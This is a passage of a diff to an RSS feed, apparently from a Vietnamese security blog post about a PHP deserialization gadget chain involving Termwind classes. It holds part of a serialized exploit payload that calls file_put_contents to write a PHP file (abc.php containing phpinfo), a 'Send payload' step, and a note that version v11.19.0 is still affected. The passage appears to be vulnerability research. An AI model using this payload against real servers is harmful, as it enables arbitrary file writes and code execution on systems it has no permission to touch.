style="color:#f92672">:</span><span style="color:#ae81ff">0</span>;<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">17</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;file_put_contents&#34;</span>;}<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">40</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;Termwind\ValueObjects\Stylesproperties&#34;</span>;<span style="color:#a6e22e">a</span><span style="color:#f92672">:</span><span style="color:#ae81ff">2</span><span style="color:#f92672">:</span>{<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">6</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;styles&#34;</span>;<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">19</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;&lt;?php phpinfo(); ?&gt;&#34;</span>;<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">12</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;parentStyles&#34;</span>;<span style="color:#a6e22e">i</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span>;}}<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">10</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;*content&#34;</span>;<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">7</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;abc.php&#34;</span>;}<span style="color:#a6e22e">i</span><span style="color:#f92672">:</span><span style="color:#ae81ff">2</span>;<span style="color:#a6e22e">r</span><span style="color:#f92672">:</span><span style="color:#ae81ff">5</span>;}}}}
+</span></span></code></pre></div><p>Send payload:</p>
 <p></p>
 <p></p>
-<p><strong>Video demo</strong></p>
-
-<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
-  <iframe src="https://www.youtube.com/embed/68zsH0hyJU8" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
-</div>
-
+</li>
+<li>
+<p><strong>Recommendation</strong></p>
+<p>Phiên bản mới nhất là v11.19.0 vẫn còn tồn tại gadget chain này.</p>
+</li>
+</ol>
 ]]></description>
 </item>
 </channel>
